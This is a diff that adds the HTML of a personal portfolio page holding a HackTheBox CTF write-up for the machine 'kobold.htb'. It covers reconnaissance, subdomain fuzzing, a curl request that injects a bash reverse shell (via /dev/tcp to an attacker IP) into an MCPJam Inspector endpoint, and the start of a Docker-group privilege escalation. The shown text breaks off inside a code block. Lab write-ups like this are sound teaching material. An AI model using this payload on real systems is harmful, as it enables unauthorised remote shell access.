@@ -1,1 +1,1182 @@
 
+html_content = '''<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTF Writeups | Abdelkrim Zouaki</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500;600&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-dark: #0a192f;
+            --bg-card: #112240;
+            --accent: #38bdf8;
+            --text-slate: #8892b0;
+            --text-light: #ccd6f6;
+            --border: #233554;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        html {
+            scroll-behavior: smooth;
+        }
+        
+        body {
+            background-color: var(--bg-dark);
+            color: var(--text-slate);
+            font-family: 'Inter', sans-serif;
+            cursor: none;
+            overflow-x: hidden;
+        }
+        
+        .font-mono {
+            font-family: 'Fira Code', monospace;
+        }
+        
+        /* Custom Cursor */
+        .cursor-dot {
+            width: 6px;
+            height: 6px;
+            background: var(--accent);
+            border-radius: 50%;
+            position: fixed;
+            pointer-events: none;
+            z-index: 9999;
+            transform: translate(-50%, -50%);
+            transition: transform 0.1s ease;
+        }
+        
+        .cursor-circle {
+            width: 40px;
+            height: 40px;
+            border: 1.5px solid var(--accent);
+            border-radius: 50%;
+            position: fixed;
+            pointer-events: none;
+            z-index: 9998;
+            transform: translate(-50%, -50%);
+            transition: all 0.15s ease-out;
+        }
+        
+        .cursor-hover .cursor-circle {
+            width: 60px;
+            height: 60px;
+            box-shadow: 0 0 20px rgba(56, 189, 248, 0.4);
+        }
+        
+        @media (pointer: coarse) {
+            .cursor-dot, .cursor-circle {
+                display: none;
+            }
+            body {
+                cursor: auto;
+            }
+        }
+        
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            width: 10px;
+        }
+        
+        ::-webkit-scrollbar-track {
+            background: var(--bg-dark);
+        }
+        
+        ::-webkit-scrollbar-thumb {
+            background: var(--border);
+            border-radius: 5px;
+        }
+        
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--accent);
+        }
+        
+        /* Scanline Overlay */
+        .scanlines {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 9990;
+            background: repeating-linear-gradient(
+                0deg,
+                transparent,
+                transparent 2px,
+                rgba(10, 25, 47, 0.03) 2px,
+                rgba(10, 25, 47, 0.03) 4px
+            );
+        }
+        
+        /* Scroll Progress Bar */
+        .progress-bar {
+            position: fixed;
+            top: 0;
+            left: 0;
+            height: 2px;
+            background: var(--accent);
+            z-index: 10000;
+            width: 0%;
+            transition: width 0.1s ease;
+        }
+        
+        /* Sidebar */
+        .sidebar {
+            position: fixed;
+            left: 0;
+            top: 0;
+            width: 40%;
+            height: 100vh;
+            background: var(--bg-dark);
+            border-right: 1px solid var(--border);
+            display: flex;
+            flex-direction: column;
+            padding: 3rem;
+            z-index: 100;
+        }
+        
+        .sidebar-top {
+            flex: 1;
+        }
+        
+        .back-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            color: var(--accent);
+            font-family: 'Fira Code', monospace;
+            font-size: 0.875rem;
+            text-decoration: none;
+            margin-bottom: 2rem;
+            transition: all 0.3s ease;
+        }
+        
+        .back-link:hover {
+            transform: translateX(-5px);
+        }
+        
+        .sidebar-name {
+            font-size: 2.5rem;
+            font-weight: 700;
+            color: var(--text-light);
+            margin-bottom: 0.5rem;
+        }
+        
+        .sidebar-subtitle {
+            font-family: 'Fira Code', monospace;
+            color: var(--accent);
+            font-size: 1.125rem;
+            margin-bottom: 1rem;
+        }
+        
+        .sidebar-tagline {
+            font-family: 'Fira Code', monospace;
+            font-size: 0.875rem;
+            color: var(--text-slate);
+            max-width: 300px;
+        }
+        
+        .sidebar-social {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            gap: 1.5rem;
+        }
+        
+        .social-line {
+            width: 1px;
+            height: 100px;
+            background: var(--border);
+            margin-left: 1rem;
+        }
+        
+        .social-icons {
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+        }
+        
+        .social-icon {
+            color: var(--text-slate);
+            transition: all 0.3s ease;
+        }
+        
+        .social-icon:hover {
+            color: var(--accent);
+            transform: translateY(-3px);
+        }
+        
+        /* Main Content */
+        .main-content {
+            margin-left: 40%;
+            min-height: 100vh;
+            padding: 0;
+        }
+        
+        /* Hero Banner */
+        .hero-banner {
+            position: relative;
+            padding: 4rem 3rem;
+            background: linear-gradient(180deg, rgba(17, 34, 64, 0.5) 0%, rgba(10, 25, 47, 0) 100%);
+            border-bottom: 1px solid rgba(56, 189, 248, 0.2);
+            overflow: hidden;
+        }
+        
+        .hero-bg {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            pointer-events: none;
+        }
+        
+        .hex-stream {
+            position: absolute;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.75rem;
+            color: var(--accent);
+            opacity: 0.03;
+            white-space: nowrap;
+            animation: drift 30s linear infinite;
+        }
+        
+        @keyframes drift {
+            0% { transform: translateX(0); }
+            100% { transform: translateX(-50%); }
+        }
+        
+        .hero-title {
+            font-size: 3rem;
+            font-weight: 700;
+            color: var(--text-light);
+            margin-bottom: 1rem;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .hero-subtitle {
+            font-family: 'Fira Code', monospace;
+            color: var(--accent);
+            font-size: 1rem;
+            margin-bottom: 2rem;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .hero-stats {
+            display: flex;
+            gap: 1rem;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .stat-pill {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            padding: 0.5rem 1rem;
+            border-radius: 9999px;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.875rem;
+            color: var(--text-light);
+        }
+        
+        /* Writeup Section */
+        .writeup-section {
+            padding: 3rem;
+        }
+        
+        .section-title {
+            font-family: 'Fira Code', monospace;
+            color: var(--accent);
+            font-size: 1rem;
+            margin-bottom: 2rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+        
+        .blink {
+            animation: blink 1s step-end infinite;
+        }
+        
+        @keyframes blink {
+            50% { opacity: 0; }
+        }
+        
+        /* Writeup Cards */
+        .writeup-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            margin-bottom: 1rem;
+            overflow: hidden;
+            transition: all 0.3s ease;
+        }
+        
+        .writeup-card:hover {
+            border-color: var(--accent);
+            box-shadow: 0 0 20px rgba(56, 189, 248, 0.1);
+        }
+        
+        .writeup-card.locked {
+            opacity: 0.4;
+            pointer-events: none;
+        }
+        
+        .writeup-card.expanded {
+            border-left: 3px solid var(--accent);
+        }
+        
+        .writeup-header {
+            padding: 1.5rem;
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-family: 'Fira Code', monospace;
+        }
+        
+        .writeup-info {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            flex-wrap: wrap;
+        }
+        
+        .writeup-name {
+            color: var(--text-light);
+            font-weight: 600;
+        }
+        
+        .writeup-meta {
+            color: var(--text-slate);
+            font-size: 0.875rem;
+        }
+        
+        .difficulty-badge {
+            padding: 0.25rem 0.75rem;
+            border-radius: 9999px;
+            font-size: 0.75rem;
+            font-weight: 600;
+        }
+        
+        .difficulty-easy {
+            background: rgba(34, 197, 94, 0.2);
+            color: #22c55e;
+        }
+        
+        .difficulty-medium {
+            background: rgba(234, 179, 8, 0.2);
+            color: #eab308;
+        }
+        
+        .writeup-action {
+            color: var(--accent);
+            font-size: 0.875rem;
+            transition: transform 0.3s ease;
+        }
+        
+        .writeup-card.expanded .writeup-action {
+            transform: rotate(180deg);
+        }
+        
+        .writeup-content {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.4s ease-out;
+        }
+        
+        .writeup-card.expanded .writeup-content {
+            max-height: 10000px;
+            transition: max-height 0.4s ease-in;
+        }
+        
+        .writeup-inner {
+            padding: 0 1.5rem 1.5rem 1.5rem;
+        }
+        
+        /* Section Headers */
+        .section-header {
+            font-family: 'Fira Code', monospace;
+            color: var(--accent);
+            font-size: 1.125rem;
+            margin: 2rem 0 1rem 0;
+            padding-bottom: 0.5rem;
+            border-bottom: 1px solid var(--border);
+            text-shadow: 0 0 20px rgba(56, 189, 248, 0.3);
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+        
+        .section-number {
+            color: var(--accent);
+            font-weight: 600;
+        }
+        
+        /* Code Blocks */
+        .code-block {
+            background: #0d1117;
+            border-radius: 8px;
+            overflow: hidden;
+            margin: 1rem 0;
+        }
+        
+        .code-header {
+            background: #161b22;
+            padding: 0.75rem 1rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+        
+        .code-dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+        }
+        
+        .code-dot.red { background: #ff5f56; }
+        .code-dot.yellow { background: #ffbd2e; }
+        .code-dot.green { background: #27c93f; }
+        
+        .code-content {
+            padding: 1rem;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.875rem;
+            overflow-x: auto;
+            line-height: 1.6;
+        }
+        
+        .code-line {
+            display: flex;
+        }
+        
+        .line-number {
+            color: var(--border);
+            min-width: 2rem;
+            text-align: right;
+            margin-right: 1rem;
+            user-select: none;
+        }
+        
+        .line-content {
+            color: var(--text-light);
+        }
+        
+        .syntax-keyword { color: #ff7b72; }
+        .syntax-string { color: #a5d6ff; }
+        .syntax-comment { color: #8b949e; }
+        .syntax-number { color: #79c0ff; }
+        
+        /* Attack Chain */
+        .attack-chain {
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            gap: 0.5rem;
+            margin: 1.5rem 0;
+            padding: 1.5rem;
+            background: rgba(17, 34, 64, 0.5);
+            border-radius: 8px;
+        }
+        
+        .chain-step {
+            background: var(--bg-dark);
+            border: 1px solid var(--accent);
+            color: var(--accent);
+            padding: 0.5rem 1rem;
+            border-radius: 9999px;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.875rem;
+        }
+        
+        .chain-arrow {
+            color: var(--accent);
+            font-size: 1.25rem;
+        }
+        
+        /* Lessons Grid */
+        .lessons-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 1rem;
+            margin-top: 1.5rem;
+        }
+        
+        .lesson-card {
+            background: var(--bg-dark);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 1.5rem;
+            transition: all 0.3s ease;
+        }
+        
+        .lesson-card:hover {
+            border-color: var(--accent);
+            transform: translateY(-5px);
+        }
+        
+        .lesson-icon {
+            font-size: 1.5rem;
+            margin-bottom: 0.75rem;
+        }
+        
+        .lesson-title {
+            color: var(--text-light);
+            font-weight: 600;
+            font-size: 0.875rem;
+            margin-bottom: 0.5rem;
+        }
+        
+        .lesson-text {
+            font-size: 0.8125rem;
+            line-height: 1.5;
+        }
+        
+        /* Flag Reveal */
+        .flag-container {
+            display: inline-flex;
+            align-items: center;
+            gap: 1rem;
+            margin: 0.5rem 0;
+        }
+        
+        .flag-text {
+            font-family: 'Fira Code', monospace;
+            background: var(--bg-dark);
+            padding: 0.5rem 1rem;
+            border-radius: 4px;
+            border: 1px solid var(--border);
+            filter: blur(5px);
+            transition: filter 0.3s ease;
+            color: var(--text-light);
+        }
+        
+        .flag-text.revealed {
+            filter: blur(0);
+        }
+        
+        .reveal-btn {
+            background: transparent;
+            border: 1px solid var(--accent);
+            color: var(--accent);
+            padding: 0.5rem 1rem;
+            border-radius: 4px;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.75rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .reveal-btn:hover {
+            background: var(--accent);
+            color: var(--bg-dark);
+        }
+        
+        /* Footer */
+        .footer {
+            padding: 3rem;
+            text-align: center;
+            border-top: 1px solid var(--border);
+            font-family: 'Fira Code', monospace;
+            font-size: 0.875rem;
+        }
+        
+        .footer a {
+            color: var(--accent);
+            text-decoration: none;
+        }
+        
+        /* Reveal Animation */
+        .reveal {
+            opacity: 0;
+            transform: translateY(30px);
+            transition: all 0.6s ease;
+        }
+        
+        .reveal.active {
+            opacity: 1;
+            transform: translateY(0);
+        }
+        
+        /* Responsive */
+        @media (max-width: 1024px) {
+            .sidebar {
+                width: 100%;
+                height: auto;
+                position: relative;
+                border-right: none;
+                border-bottom: 1px solid var(--border);
+                padding: 2rem;
+            }
+            
+            .main-content {
+                margin-left: 0;
+            }
+            
+            .social-line {
+                display: none;
+            }
+            
+            .sidebar-social {
+                flex-direction: row;
+                margin-top: 2rem;
+            }
+            
+            .social-icons {
+                flex-direction: row;
+            }
+            
+            .lessons-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+        
+        @media (max-width: 768px) {
+            .hero-title {
+                font-size: 2rem;
+            }
+            
+            .writeup-section {
+                padding: 2rem 1.5rem;
+            }
+            
+            .hero-banner {
+                padding: 2rem 1.5rem;
+            }
+            
+            .lessons-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .attack-chain {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            
+            .chain-arrow {
+                transform: rotate(90deg);
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Custom Cursor -->
+    <div class="cursor-dot"></div>
+    <div class="cursor-circle"></div>
+    
+    <!-- Scanline Overlay -->
+    <div class="scanlines"></div>
+    
+    <!-- Scroll Progress Bar -->
+    <div class="progress-bar" id="progressBar"></div>
+    
+    <!-- Sidebar -->
+    <aside class="sidebar">
+        <div class="sidebar-top">
+            <a href="index.html" class="back-link interactive">
+                <span>←</span> Back to Portfolio
+            </a>
+            <h1 class="sidebar-name">Abdelkrim Zouaki</h1>
+            <p class="sidebar-subtitle">// CTF Writeups</p>
+            <p class="sidebar-tagline">"Breaking things to understand them."</p>
+        </div>
+        
+        <div class="sidebar-social">
+            <div class="social-line"></div>
+            <div class="social-icons">
+                <a href="https://github.com" target="_blank" class="social-icon interactive" aria-label="GitHub">
+                    <svg width="24" height="24" fill="currentColor" viewBox="0 0 24 24">
+                        <path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/>
+                    </svg>
+                </a>
+                <a href="https://linkedin.com" target="_blank" class="social-icon interactive" aria-label="LinkedIn">
+                    <svg width="24" height="24" fill="currentColor" viewBox="0 0 24 24">
+                        <path d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z"/>
+                    </svg>
+                </a>
+                <a href="mailto:contact@example.com" class="social-icon interactive" aria-label="Email">
+                    <svg width="24" height="24" fill="currentColor" viewBox="0 0 24 24">
+                        <path d="M0 3v18h24v-18h-24zm21.518 2l-9.518 7.713-9.518-7.713h19.036zm-19.518 14v-11.817l10 8.104 10-8.104v11.817h-20z"/>
+                    </svg>
+                </a>
+            </div>
+        </div>
+    </aside>
+    
+    <!-- Main Content -->
+    <main class="main-content">
+        <!-- Hero Banner -->
+        <section class="hero-banner">
+            <div class="hero-bg" id="heroBg"></div>
+            <h1 class="hero-title">CTF Writeups</h1>
+            <p class="hero-subtitle">> Documented intrusions. Understood vulnerabilities. Lessons compiled.</p>
+            <div class="hero-stats">
+                <span class="stat-pill">Machines Rooted: 1</span>
+                <span class="stat-pill">Platform: HackTheBox</span>
+            </div>
+        </section>
+        
+        <!-- Writeup Selector -->
+        <section class="writeup-section">
+            <div class="section-title reveal">
+                [ SELECT WRITEUP ]<span class="blink">_</span>
+            </div>
+            
+            <!-- Kobold Writeup Card -->
+            <div class="writeup-card reveal" id="koboldCard">
+                <div class="writeup-header interactive" onclick="toggleWriteup('kobold')">
+                    <div class="writeup-info">
+                        <span class="writeup-name">kobold.htb</span>
+                        <span class="writeup-meta">............</span>
+                        <span class="difficulty-badge difficulty-easy">Easy</span>
+                        <span class="writeup-meta">| Linux | HackTheBox</span>
+                        <span class="writeup-meta">...........</span>
+                    </div>
+                    <span class="writeup-action" id="koboldAction">[CLICK TO EXPAND ▼]</span>
+                </div>
+                <div class="writeup-content" id="koboldContent">
+                    <div class="writeup-inner">
+                        
+                        <!-- 01. Reconnaissance -->
+                        <div class="section-header">
+                            <span class="section-number">// 01.</span> RECONNAISSANCE
+                        </div>
+                        
+                        <p style="margin-bottom: 1rem; line-height: 1.7;">
+                            <strong>Machine:</strong> Kobold | <strong>Difficulty:</strong> Easy | <strong>OS:</strong> Linux | <strong>Platform:</strong> HackTheBox<br>
+                            <strong>Released:</strong> March 21, 2026 | <strong>CVEs:</strong> GHSA-232v-j27c-5pp6, CVE-2026-23520
+                        </p>
+                        
+                        <p style="margin-bottom: 1rem; line-height: 1.7;">
+                            Initial nmap scan revealed three open ports. Port 3552 was missed on the initial scan — always use <code style="background: var(--bg-dark); padding: 0.2rem 0.4rem; border-radius: 3px; color: var(--accent);">-p-</code>.
+                        </p>
+                        
+                        <div class="code-block">
+                            <div class="code-header">
+                                <div class="code-dot red"></div>
+                                <div class="code-dot yellow"></div>
+                                <div class="code-dot green"></div>
+                                <span style="margin-left: 0.5rem; color: var(--text-slate); font-size: 0.75rem;">nmap.txt</span>
+                            </div>
+                            <div class="code-content">
+                                <div class="code-line"><span class="line-number">1</span><span class="line-content"><span class="syntax-keyword">PORT</span>    <span class="syntax-keyword">STATE</span>  <span class="syntax-keyword">SERVICE</span>   <span class="syntax-keyword">VERSION</span></span></div>
+                                <div class="code-line"><span class="line-number">2</span><span class="line-content"><span class="syntax-number">22/tcp</span>  open   ssh       OpenSSH 9.6p1 Ubuntu</span></div>
+                                <div class="code-line"><span class="line-number">3</span><span class="line-content"><span class="syntax-number">80/tcp</span>  open   http      nginx 1.24.0 → redirects to HTTPS</span></div>
+                                <div class="code-line"><span class="line-number">4</span><span class="line-content"><span class="syntax-number">443/tcp</span> open   ssl/http  nginx 1.24.0 — kobold.htb</span></div>
+                                <div class="code-line"><span class="line-number">5</span><span class="line-content">        wildcard SAN: *.kobold.htb</span></div>
+                                <div class="code-line"><span class="line-number">6</span><span class="line-content"><span class="syntax-number">3552/tcp</span> open  unknown   Arcane Docker Management API</span></div>
+                            </div>
+                        </div>
+                        
+                        <p style="background: rgba(56, 189, 248, 0.1); border-left: 3px solid var(--accent); padding: 1rem; border-radius: 0 4px 4px 0; margin: 1rem 0;">
+                            <strong style="color: var(--accent);">Key observation:</strong> Wildcard SSL cert (<code style="background: var(--bg-dark); padding: 0.2rem 0.4rem; border-radius: 3px;">*.kobold.htb</code>) → subdomains exist. Port 3552 was missed on the initial scan — always use <code style="background: var(--bg-dark); padding: 0.2rem 0.4rem; border-radius: 3px;">-p-</code>.
+                        </p>
+                        
+                        <!-- 02. Subdomain Enumeration -->
+                        <div class="section-header">
+                            <span class="section-number">// 02.</span> SUBDOMAIN ENUMERATION
+                        </div>
+                        
+                        <p style="margin-bottom: 1rem; line-height: 1.7;">
+                            Added <code style="background: var(--bg-dark); padding: 0.2rem 0.4rem; border-radius: 3px; color: var(--accent);">kobold.htb</code> to <code style="background: var(--bg-dark); padding: 0.2rem 0.4rem; border-radius: 3px;">/etc/hosts</code>. Ran ffuf with Host header fuzzing — filtered out 302 noise (size 154):
+                        </p>
+                        
+                        <div class="code-block">
+                            <div class="code-header">
+                                <div class="code-dot red"></div>
+                                <div class="code-dot yellow"></div>
+                                <div class="code-dot green"></div>
+                                <span style="margin-left: 0.5rem; color: var(--text-slate); font-size: 0.75rem;">bash</span>
+                            </div>
+                            <div class="code-content">
+                                <div class="code-line"><span class="line-number">1</span><span class="line-content">ffuf -w subdomains-top1million-5000.txt \\</span></div>
+                                <div class="code-line"><span class="line-number">2</span><span class="line-content">     -u https://kobold.htb/ \\</span></div>
+                                <div class="code-line"><span class="line-number">3</span><span class="line-content">     -H <span class="syntax-string">"Host: FUZZ.kobold.htb"</span> \\</span></div>
+                                <div class="code-line"><span class="line-number">4</span><span class="line-content">     -k -mc all -fs 154</span></div>
+                            </div>
+                        </div>
+                        
+                        <p style="margin: 1rem 0; font-weight: 600; color: var(--text-light);">Discovered:</p>
+                        <ul style="margin-left: 1.5rem; line-height: 1.8;">
+                            <li><code style="background: var(--bg-dark); padding: 0.2rem 0.4rem; border-radius: 3px; color: var(--accent);">bin.kobold.htb</code> → PrivateBin v2.0.2 (encrypted pastebin)</li>
+                            <li><code style="background: var(--bg-dark); padding: 0.2rem 0.4rem; border-radius: 3px; color: var(--accent);">mcp.kobold.htb</code> → MCPJam Inspector (AI agent management UI)</li>
+                            <li><code style="background: var(--bg-dark); padding: 0.2rem 0.4rem; border-radius: 3px; color: var(--accent);">kobold.htb:3552</code> → Arcane Docker Management API</li>
+                        </ul>
+                        
+                        <!-- 03. Initial Foothold -->
+                        <div class="section-header">
+                            <span class="section-number">// 03.</span> INITIAL FOOTHOLD — GHSA-232v-j27c-5pp6
+                        </div>
+                        
+                        <p style="margin-bottom: 1rem; line-height: 1.7;">
+                            <strong>Target:</strong> <code style="background: var(--bg-dark); padding: 0.2rem 0.4rem; border-radius: 3px; color: var(--accent);">https://mcp.kobold.htb/api/mcp/connect</code>
+                        </p>
+                        
+                        <p style="margin-bottom: 1rem; line-height: 1.7;">
+                            MCPJam Inspector supports two MCP transport types:
+                        </p>
+                        <ul style="margin-left: 1.5rem; margin-bottom: 1rem; line-height: 1.8;">
+                            <li><strong>SSE</strong> — connects to remote HTTP server</li>
+                            <li><strong>STDIO</strong> — spawns a LOCAL process and communicates via stdin/stdout ← <span style="color: #ff7b72; font-weight: 600;">vulnerable</span></li>
+                        </ul>
+                        
+                        <p style="margin-bottom: 1rem; line-height: 1.7;">
+                            The <code style="background: var(--bg-dark); padding: 0.2rem 0.4rem; border-radius: 3px;">/api/mcp/connect</code> endpoint accepted <code style="background: var(--bg-dark); padding: 0.2rem 0.4rem; border-radius: 3px;">transportType: stdio</code> with a <code style="background: var(--bg-dark); padding: 0.2rem 0.4rem; border-radius: 3px;">command</code> field — executing it directly on the server with <strong style="color: #ff7b72;">zero authentication, zero sanitization</strong>.
+                        </p>
+                        
+                        <p style="margin: 1rem 0; font-weight: 600; color: var(--text-light);">Exploit:</p>
+                        
+                        <div class="code-block">
+                            <div class="code-header">
+                                <div class="code-dot red"></div>
+                                <div class="code-dot yellow"></div>
+                                <div class="code-dot green"></div>
+                                <span style="margin-left: 0.5rem; color: var(--text-slate); font-size: 0.75rem;">bash</span>
+                            </div>
+                            <div class="code-content">
+                                <div class="code-line"><span class="line-number">1</span><span class="line-content"><span class="syntax-comment"># Terminal 1 — start listener</span></span></div>
+                                <div class="code-line"><span class="line-number">2</span><span class="line-content">nc -lvnp 4444</span></div>
+                                <div class="code-line"><span class="line-number">3</span><span class="line-content"></span></div>
+                                <div class="code-line"><span class="line-number">4</span><span class="line-content"><span class="syntax-comment"># Terminal 2 — fire reverse shell</span></span></div>
+                                <div class="code-line"><span class="line-number">5</span><span class="line-content">curl -sk -X POST https://mcp.kobold.htb/api/mcp/connect \\</span></div>
+                                <div class="code-line"><span class="line-number">6</span><span class="line-content">  -H <span class="syntax-string">"Content-Type: application/json"</span> \\</span></div>
+                                <div class="code-line"><span class="line-number">7</span><span class="line-content">  -d <span class="syntax-string">'{</span></span></div>
+                                <div class="code-line"><span class="line-number">8</span><span class="line-content">    <span class="syntax-string">"serverId": "x",</span></span></div>
+                                <div class="code-line"><span class="line-number">9</span><span class="line-content">    <span class="syntax-string">"serverConfig": {</span></span></div>
+                                <div class="code-line"><span class="line-number">10</span><span class="line-content">      <span class="syntax-string">"transportType": "stdio",</span></span></div>
+                                <div class="code-line"><span class="line-number">11</span><span class="line-content">      <span class="syntax-string">"command": "bash",</span></span></div>
+                                <div class="code-line"><span class="line-number">12</span><span class="line-content">      <span class="syntax-string">"args": ["-c", "bash -i >& /dev/tcp/10.10.14.33/4444 0>&1"]</span></span></div>
+                                <div class="code-line"><span class="line-number">13</span><span class="line-content">    <span class="syntax-string">}</span></span></div>
+                                <div class="code-line"><span class="line-number">14</span><span class="line-content">  <span class="syntax-string">}'</span></span></div>
+                            </div>
+                        </div>
+                        
+                        <p style="margin: 1rem 0; line-height: 1.7;">
+                            <strong>Result:</strong> <code style="background: var(--bg-dark); padding: 0.2rem 0.4rem; border-radius: 3px; color: #22c55e;">ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$</code> ✅
+                        </p>
+                        
+                        <p style="margin: 1rem 0;">
+                            User flag: 
+                            <div class="flag-container">
+                                <span class="flag-text" id="userFlag">45376bfcd31373b92a771fa57e373145</span>
+                                <button class="reveal-btn interactive" onclick="toggleFlag('userFlag')">REVEAL FLAG</button>
+                            </div>
+                        </p>
+                        
+                        <!-- 04. Privilege Escalation -->
+                        <div class="section-header">
+                            <span class="section-number">// 04.</span> PRIVILEGE ESCALATION — CVE-2026-23520
+                        </div>
+                        
+                        <p style="margin: 1rem 0; font-weight: 600; color: var(--text-light);">Step 1 — Group enumeration:</p>
+                        
+                        <div class="code-block">
+                            <div class="code-header">
+                                <div class="code-dot red"></div>
+                                <div class="code-dot yellow"></div>
+                                <div class="code-dot green"></div>
+                                <span style="margin-left: 0.5rem; color: var(--text-slate); font-size: 0.75rem;">bash</span>
+                            </div>
+                            <div class="code-content">
+                                <div class="code-line"><span class="line-number">1</span><span class="line-content">uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)</span></div>
+                            </div>
+                        </div>
+                        
+                        <p style="margin: 1rem 0; line-height: 1.7;">
+                            <code style="background: var(--bg-dark); padding: 0.2rem 0.4rem; border-radius: 3px; color: var(--accent);">operator</code> group → can use <code style="background: var(--bg-dark); padding: 0.2rem 0.4rem; border-radius: 3px;">newgrp</code> to switch into <code style="background: var(--bg-dark); padding: 0.2rem 0.4rem; border-radius: 3px;">docker</code> group.
+                        </p>
+                        
+                        <p style="margin: 1rem 0; font-weight: 600; color: var(--text-light);">Step 2 — Leaked Arcane service key:</p>
+                        
+                        <div class="code-block">
+                            <div class="code-header">
+                                <div class="code-dot red"></div>
+                                <div class="code-dot yellow"></div>
+                                <div class="code-dot green"></div>
+                                <span style="margin-left: 0.5rem; color: var(--text-slate); font-size: 0.75rem;">bash</span>
+                            </div>
+                            <div class="code-content">
+                                <div class="code-line"><span class="line-number">1</span><span class="line-content">cat /etc/systemd/system/arcane.service</span></div>
+                                <div class="code-line"><span class="line-number">2</span><span class="line-content"><span class="syntax-comment"># Environment=ENCRYPTION_KEY="Q3PbC9fpq/..."</span></span></div>
+                            </div>
+                        </div>
+                        
+                        <p style="margin: 1rem 0; font-weight: 600; color: var(--text-light);">Step 3 — Internal port mapping via /proc:</p>
+                        
+                        <div class="code-block">
+                            <div class="code-header">
+                                <div class="code-dot red"></div>
+                                <div class="code-dot yellow"></div>
+                                <div class="code-dot green"></div>
+                                <span style="margin-left: 0.5rem; color: var(--text-slate); font-size: 0.75rem;">bash</span>
+                            </div>
+                            <div class="code-content">
+                                <div class="code-line"><span class="line-number">1</span><span class="line-content">127.0.0.1:6274  → MCPJam backend</span></div>
+                                <div class="code-line"><span class="line-number">2</span><span class="line-content">127.0.0.1:8080  → PrivateBin (Docker)</span></div>
+                                <div class="code-line"><span class="line-number">3</span><span class="line-content">0.0.0.0:3552    → Arcane (public)</span></div>
+                            </div>
+                        </div>
+                        
+                        <p style="margin: 1rem 0; font-weight: 600; color: var(--text-light);">Step 4 — Docker escape:</p>
+                        
+                        <p style="margin-bottom: 1rem; line-height: 1.7;">
+                            <code style="background: var(--bg-dark); padding: 0.2rem 0.4rem; border-radius: 3px; color: var(--accent);">operator</code> → <code style="background: var(--bg-dark); padding: 0.2rem 0.4rem; border-radius: 3px;">newgrp docker</code> → mount host filesystem inside container → write SSH key to <code style="background: var(--bg-dark); padding: 0.2rem 0.4rem; border-radius: 3px;">/root/.ssh/authorized_keys</code>:
+                        </p>
+                        
+                        <div class="code-block">
+                            <div class="code-header">
+                                <div class="code-dot red"></div>
+                                <div class="code-dot yellow"></div>
+                                <div class="code-dot green"></div>
+                                <span style="margin-left: 0.5rem; color: var(--text-slate); font-size: 0.75rem;">bash</span>
+                            </div>
+                            <div class="code-content">
